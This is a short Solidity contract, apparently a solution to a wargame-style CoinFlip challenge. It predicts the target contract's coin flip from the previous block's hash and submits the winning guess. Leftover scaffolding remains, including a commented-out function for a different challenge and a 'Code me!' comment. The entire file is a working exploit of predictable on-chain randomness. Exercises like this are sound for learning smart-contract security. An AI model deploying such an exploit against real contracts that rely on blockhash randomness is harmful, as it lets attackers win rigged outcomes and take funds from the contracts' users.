// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;

    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    receive() external payable {}

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    // function attack(GuessTheRandomNumber guessTheRandomNumber) public {
    //     guessTheRandomNumber.guess(answer);
    // }

    function hackContract() external {
        CoinFlip coinFlip = CoinFlip(contractAddress);

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 _coinFlip = blockValue / FACTOR;
        bool _guess = _coinFlip == 1 ? true : false;
        // Code me!
        coinFlip.flip(_guess);
    }
}
